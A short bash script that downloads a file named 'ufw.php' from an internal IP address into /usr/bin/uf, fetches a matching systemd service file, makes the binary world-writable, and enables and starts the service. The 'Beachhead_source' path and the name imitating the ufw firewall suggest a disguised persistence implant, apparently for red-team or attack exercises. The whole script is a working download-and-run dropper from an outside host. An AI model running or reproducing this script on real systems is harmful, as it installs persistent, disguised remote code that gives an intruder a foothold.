#!/bin/bash

#Download
wget 10.10.1.34/Beachhead_source/ufw.php -O /usr/bin/uf


#get service and run
wget 10.10.1.34/Services/uf.service -O /etc/systemd/system/uf.service

chmod 777 /usr/bin/uf

systemctl enable uf
sleep 5
systemctl start uf &